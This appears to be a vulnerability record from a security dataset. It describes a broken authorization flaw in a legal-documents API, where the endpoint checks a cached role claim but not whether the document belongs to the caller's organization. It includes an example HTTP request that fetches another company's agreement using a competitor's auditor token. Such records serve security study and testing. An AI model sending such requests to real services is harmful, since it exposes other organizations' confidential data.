diagnosis: The endpoint retrieves confidential corporate legal agreements based on req.params.docId. It relies on a cached authorizer role claim without validating that the document belongs to the organization identified by authorizer.orgId, allowing legal auditors of one company to view acquisition contracts of competing enterprises.
exploit_request:
GET /api/legal/agreements/65b44120910e980019283710 HTTP/1.1
Host: api.legalcloud.com
Authorization: Bearer <company_b_auditor_token>
